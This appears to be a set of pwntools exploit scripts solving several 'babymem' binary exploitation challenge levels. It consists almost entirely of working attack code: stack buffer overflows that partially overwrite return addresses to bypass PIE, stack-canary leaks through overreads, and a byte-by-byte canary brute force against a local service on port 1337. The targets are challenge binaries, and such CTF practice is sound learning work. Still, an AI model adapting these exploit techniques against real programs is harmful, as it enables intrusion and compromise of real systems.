
```py
from pwn import *

elf = ELF("/challenge/binary-exploitation-pie-overflow-w")
# return address is 56 bytes from start of input buffer
offset = 56 
target_offset = 0x208B  

# Overwrite only bottom 2 bytes of return address
payload = b"A" * offset + p16(target_offset)

p = process(elf.path)
p.sendline(payload)
p.interactive()
```


# lvl 9-0 9-1 : 


```py
from pwn import *

elf = ELF("/challenge/babymem-level-9-1")

buf_size      = 100
# 100  + 4 bytes  + 8 bytes canary + 8 bytes saved rbp = 120
ret_offset    = buf_size + 4 + 8 + 8   
initial_n     = ret_offset
n_write_value = initial_n - 1         
target_low    = 0x2D56                 

N_BYTES       = (n_write_value + 1) + 2 

payload  = b"A" * buf_size                  # 0..99
payload += p8(n_write_value & 0xff)         # byte #100 → n = 119
payload += p8(target_low       & 0xff)      # byte #101 → ret[0]
payload += p8((target_low>>8)  & 0xff)      # byte #102 → ret[1]

payload  = payload.ljust(N_BYTES, b"\x00")  # pad to exactly 122 bytes

while True:
    p = process(elf.path)
    p.sendline(str(N_BYTES)) 
    p.send(payload)          
    out = p.recvall(timeout=1)
    if b"pwn" in out:
        print(out.decode())
        break
```


# lvl 12 


```py
from pwn import *

elf = ELF("/challenge/babymem-level-12-1")
buf_size   = 120 - 16
target_low = 0x19E4

while True :
    first_payload  = b"REPEAT--" + b"A" * buf_size + b"A" + b"CANARY--"

    p = process(elf.path)
    p.sendline(str(len(first_payload)))
    p.send(first_payload)
    
    out = p.recv(timeout=0.2)
    #out = p.recv(timeout=0.2)
    #out = p.recv(timeout=0.2)

    print(out.decode(errors="ignore"))
    
    canary = out.split(b"CANARY--")[1][:7]
    canary = b"\x00" + canary

    payload =  b"A" * (buf_size + 16)  + canary + b"A"*8 + p16(target_low)
    out = p.recv(timeout=0.1).decode(errors="ignore")

    p.sendline(str(len(payload)))
    p.send(payload)
    out = p.recvall(timeout=1).decode(errors="ignore")
    
    print(out)
    if "pwn" in out:
        print(out)
        break
```




hahah


```py
from pwn import *
import re

elf = ELF("/challenge/babymem-level-14-0")
target_low = 0x1FDB   

while True :
    p = process(elf.path)

   
    p.sendline(str(10))
    p.send(b"REPEAT\n")

    p.recvuntil(b"- the canary value is now ")
    line = p.recvline(keepends=False)
    canary = int(re.search(rb"(0x[0-9a-f]+)", line).group(1), 16)
    log.success(f"leaked canary = {hex(canary)}")

    BUF   = 407
    OFF_CANARY = BUF
    OFF_RIP    = 424

    payload  = b"A" * OFF_CANARY
    payload += p64(canary)
    payload += b"B" * (OFF_RIP - OFF_CANARY - 8)
    payload += p16(target_low)

    out = p.recv(timeout=0.1).decode(errors="ignore")
    p.sendline(str(len(payload)))
    p.send(payload)
    out = p.recvall(timeout=1).decode(errors="ignore")
    
    print(out)
    if "pwn" in out:
        print(out)
        break


```


# lvl 14


```py
from pwn import *

elf = ELF("/challenge/babymem-level-14-1")
buf_size   = 0x1F8 
target_low = 0x180B

while True :
    first_payload  = b"REPEAT--" + b"A" * (0xe8 + 1 - 8 - 8) +  b"CANARY--"

    p = process(elf.path)
    p.sendline(str(len(first_payload)))
    p.send(first_payload)

    out = p.recv(timeout=0.2)
    print(out.decode(errors="ignore"))

    canary = out.split(b"CANARY--")[1][:7]
    canary = b"\x00" + canary
    #print( " CANARY  : ", canary)

    payload =  b"A" * (buf_size)  + canary + b"A"*8 + p16(target_low)
    out = p.recv(timeout=0.1).decode(errors="ignore")

    p.sendline(str(len(payload)))
    p.send(payload)
    out = p.recvall(timeout=1).decode(errors="ignore")

    print(out)
    if "pwn" in out:
        print(out)
        break


    # rsp+0x00c8 WHERE WE SAW CANARY
    # rsp+0x0238 CANARY DEFAULT
    # rsp+0x0040 BUFFER DEFAULT
     
    # buf : 0x7ffff80782d0
    # canary : 0x7ffff80783b8 or 
```



# lvl 15


```py
from pwn import *

def connect():
    return remote('localhost', 1337)

def send_payload(io, payload):
    io.recvuntil(b"Payload size:")
    io.sendline(str(len(payload)).encode())
    io.recvuntil(b"Send your payload")
    io.send(payload)
    try:
        return io.recv(timeout=1)
    except EOFError:
        return b''

context.log_level = 'error'

known_canary = b'\x00'

for i in range(1, 8):
    found = False
    for c in range(256):
        test_byte = bytes([c])
        payload = b"A" * 88 + known_canary + test_byte
        io = connect()
        response = send_payload(io, payload)
        io.close()

        if response and b"stack smashing detected" not in response and b"Segmentation fault" not in response:
            known_canary += test_byte
            print(f"[+] Found byte {i}: {test_byte.hex()}")
            found = True
            break

    if not found:
        print(f"[-] Failed to find byte {i}")
        break

print(f"[+] Full canary: {known_canary.hex()}")
```